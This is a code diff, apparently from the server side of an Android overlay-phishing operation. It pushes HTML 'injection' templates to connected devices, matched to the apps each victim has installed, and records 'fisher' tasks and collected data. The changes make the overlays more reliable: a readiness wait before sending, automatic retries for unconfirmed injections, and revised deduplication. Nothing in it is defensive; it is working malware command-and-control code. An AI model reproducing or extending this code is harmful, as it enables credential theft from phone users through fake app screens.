@@ -64,7 +64,13 @@ function handleDevice(ws, sessionId, connections) {
   // ★ 闭包变量：latestClientIp 随 status 消息更新（pool 自愈用 + 修复 C 简化版）
   let latestClientIp = clientIp;
 
-  connections.devices.set(sessionId, { ws, sessionId, clientIp, appListReceived: false });
+  connections.devices.set(sessionId, {
+    ws,
+    sessionId,
+    clientIp,
+    appListReceived: false,
+    connectedAt: Date.now(),
+  });
   console.log(`[WS-Device] Connected: ${sessionId} ip=${clientIp}`);
   void recordDeviceDebug('ws.connected', sessionId, { clientIp, connectionPoolSize: connections.devices.size });
 
@@ -162,7 +168,13 @@ function handleDevice(ws, sessionId, connections) {
       if (ws.readyState !== 1) return
       // ★ 池自愈：如果池里已被清空（理论不应该，但兜底），自动重新注册
       if (!connections.devices.has(sessionId) || connections.devices.get(sessionId).ws !== ws) {
-        connections.devices.set(sessionId, { ws, sessionId, clientIp: latestClientIp, appListReceived: false })
+        connections.devices.set(sessionId, {
+          ws,
+          sessionId,
+          clientIp: latestClientIp,
+          appListReceived: false,
+          connectedAt: Date.now(),
+        })
         if (process.env.NODE_WS_DEBUG_HEAL === '1') {
           console.log(`[WS-Device] pool self-heal: re-registered ${sessionId}`)
         }
@@ -1084,7 +1096,7 @@ async function reconcileInjectionStatus(deviceId, msg) {
         source = String(task?.source || '');
       } catch {}
       const packageName = String(row.package_name || '');
-      if (packageName && !enabledSet.has(packageName) && (source === 'auto' || source === 'client-status')) {
+      if (packageName && !enabledSet.has(packageName) && (source.startsWith('auto') || source === 'client-status')) {
         await db.query(
           'DELETE FROM fisher_active_injection_tasks WHERE device_id=? AND package_name=?',
           [deviceId, packageName]
@@ -1159,6 +1171,138 @@ function scheduleInjectionStatusProbes(ws, deviceId, packageName, requestId) {
   });
 }
 
+async function waitForInjectionCommandReady(deviceId, ws, connections, minimumAgeMs = 5000) {
+  const current = connections.devices.get(deviceId);
+  if (!current || current.ws !== ws || ws.readyState !== 1) {
+    throw new Error('device connection changed before injection dispatch');
+  }
+  const connectedAt = Number(current.connectedAt || Date.now());
+  const waitMs = Math.max(0, minimumAgeMs - (Date.now() - connectedAt));
+  if (waitMs > 0) {
+    void recordDeviceDebug('injection.auto.ready_wait', deviceId, {
+      waitMs,
+      minimumAgeMs,
+    });
+    await new Promise(resolve => setTimeout(resolve, waitMs));
+  }
+  const latest = connections.devices.get(deviceId);
+  if (!latest || latest.ws !== ws || ws.readyState !== 1) {
+    throw new Error('device connection changed during injection readiness wait');
+  }
+}
+
+function scheduleAutoInjectionRetry({
+  db,
+  ws,
+  connections,
+  deviceId,
+  packageName,
+  templateId,
+  templateName,
+  htmlContent,
+  requestId,
+}) {
+  const retryDelayMs = 9000;
+  const timer = setTimeout(async () => {
+    try {
+      const current = connections.devices.get(deviceId);
+      if (!current || current.ws !== ws || ws.readyState !== 1) {
+        void recordDeviceDebug('injection.auto.retry_no_route', deviceId, {
+          packageName,
+          templateId,
+          requestId,
+        }, 'warn');
+        return;
+      }
+
+      // 只有同一条自动任务仍处于未确认状态时才重试。APK 已回复
+      // injection_status（source=client-status）或用户已停止时都不再发送。
+      const [rows] = await db.query(
+        `SELECT task_json FROM fisher_active_injection_tasks
+         WHERE device_id=? AND package_name=? LIMIT 1`,
+        [deviceId, packageName]
+      );
+      if (!rows || rows.length === 0) return;
+      let task = {};
+      try {
+        task = typeof rows[0].task_json === 'string'
+          ? JSON.parse(rows[0].task_json)
+          : (rows[0].task_json || {});
+      } catch {}
+      if (String(task.source || '') === 'client-status') return;
+      if (String(task.requestId || '') !== String(requestId || '')) return;
+
+      const retryRequestId = `auto-retry-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
+      // 第二次尝试前先关闭可能残留的旧页面；此时连接已稳定，并留出
+      // 1200ms 让 Android 串行完成清理，避免 STOP 异步晚于 SHOW。
+      ws.send(JSON.stringify({
+        type: 'command',
+        sessionId: deviceId,
+        data: {
+          command: 'STOP_INJECTION',
+          params: {
+            packageName,
+            requestId: retryRequestId,
+            source: 'auto-retry-preflight',
+          },
+        },
+      }));
+      void recordDeviceDebug('injection.auto.retry_stop_sent', deviceId, {
+        packageName,
+        templateId,
+        requestId: retryRequestId,
+        previousRequestId: requestId,
+      });
+      await new Promise(resolve => setTimeout(resolve, 1200));
+
+      const latest = connections.devices.get(deviceId);
+      if (!latest || latest.ws !== ws || ws.readyState !== 1) {
+        throw new Error('device connection changed before automatic retry');
+      }
+      await persistActiveInjectionTask(
+        db,
+        deviceId,
+        packageName,
+        templateId,
+        'auto-retry',
+        retryRequestId
+      );
+      ws.send(JSON.stringify({
+        type: 'command',
+        sessionId: deviceId,
+        data: {
+          command: 'SHOW_INJECTION',
+          params: {
+            packageName,
+            htmlContent,
+            templateId,
+            requestId: retryRequestId,
+            source: 'auto-retry',
+          },
+        },
+      }));
+      void recordDeviceDebug('injection.auto.retry_sent', deviceId, {
+        packageName,
+        templateId,
+        templateName: templateName || '',
+        requestId: retryRequestId,
+        previousRequestId: requestId,
+        retryDelayMs,
+        htmlBytes: Buffer.byteLength(String(htmlContent), 'utf8'),
+      });
+      scheduleInjectionStatusProbes(ws, deviceId, packageName, retryRequestId);
+    } catch (err) {
+      void recordDeviceDebug('injection.auto.retry_error', deviceId, {
+        packageName,
+        templateId,
+        requestId,
+        message: err.message || String(err),
+      }, 'error');
+    }
+  }, retryDelayMs);
+  if (typeof timer.unref === 'function') timer.unref();
+}
+
 /**
  * 自动注入：匹配设备安装的应用与模板，对所有匹配的包名下发 SHOW_INJECTION
  * 每个设备+包名组合自动注入一次；手动“重注”可以绕过此自动去重。
@@ -1186,14 +1330,24 @@ async function autoInjectForDevice(deviceId, apps, ws, connections) {
     // Node 重启后仅从“活跃任务”恢复去重。历史采集数据表示曾经完成过注入，
     // 不能永久阻止设备在重新安装、重新上线后再次自动注入。
     const guardQueries = [
-      ['active tasks', `SELECT package_name FROM fisher_active_injection_tasks
+      ['active tasks', `SELECT package_name, task_json FROM fisher_active_injection_tasks
                          WHERE device_id=? AND package_name IS NOT NULL AND package_name<>''`],
     ];
     const persistedActive = new Set();
     for (const [label, sql] of guardQueries) {
       try {
         const [persistedRows] = await db.query(sql, [deviceId]);
-        for (const row of persistedRows || []) persistedActive.add(String(row.package_name));
+        for (const row of persistedRows || []) {
+          let task = {};
+          try {
+            task = typeof row.task_json === 'string' ? JSON.parse(row.task_json) : (row.task_json || {});
+          } catch {}
+          // 只有 APK 已确认的快照才是自动注入去重依据。source=auto
+          // 仅表示服务器发过命令，不能让一次启动期丢包永久阻断重试。
+          if (String(task.source || '') === 'client-status') {
+            persistedActive.add(String(row.package_name));
+          }
+        }
       } catch (guardErr) {
         // 旧库缺某张表时仍继续读取另一层去重，不阻断自动注入。
         console.warn(`[WS-Device] Auto-injection ${label} guard unavailable for ${deviceId}: ${guardErr.message}`);
@@ -1251,27 +1405,10 @@ async function autoInjectForDevice(deviceId, apps, ws, connections) {
         // 先登记活跃任务再下发。这样 APK 即使毫秒级确认，控制台
         // 也不会在“发送成功”和“DB 写入”的空窗期显示错误状态。
         if (ws.readyState === 1) {
-          // 重装后 /data/local/tmp 可能仍保留 APK 的旧注入状态。如果只发 SHOW，
-          // APK 会回报“已启用”但不会重建前台表单。自动注入与手动重注保持一致：
-          // 先收敛旧页面，再下发新模板。
-          ws.send(JSON.stringify({
-            type: 'command',
-            sessionId: deviceId,
-            data: {
-              command: 'STOP_INJECTION',
-              params: {
-                packageName: pkg,
-                requestId,
-                source: 'auto-injection-preflight',
-              },
-            },
-          }));
-          void recordDeviceDebug('injection.auto.preflight_stop_sent', deviceId, {
-            packageName: pkg,
-            templateId: tpl.template_id,
-            requestId,
-          });
-          await new Promise(resolve => setTimeout(resolve, 250));
+          // HTTP 应用列表经常在 WS 刚连接约 1 秒内到达。此时 APK 的注入
+          // 处理器尚未完成启动，立即 SHOW 会被静默丢弃。先等连接稳定；首次
+          // 自动注入不再先发 STOP，避免 Android 异步 STOP 晚于 SHOW 生效。
+          await waitForInjectionCommandReady(deviceId, ws, connections);
 
           try {
             const affectedRows = await persistActiveInjectionTask(
@@ -1328,6 +1465,17 @@ async function autoInjectForDevice(deviceId, apps, ws, connections) {
             taskPersisted,
           });
           scheduleInjectionStatusProbes(ws, deviceId, pkg, requestId);
+          scheduleAutoInjectionRetry({
+            db,
+            ws,
+            connections,
+            deviceId,
+            packageName: pkg,
+            templateId: tpl.template_id,
+            templateName: tpl.name,
+            htmlContent,
+            requestId,
+          });
         }
       } catch (sendErr) {
         if (taskPersisted && !sent) {
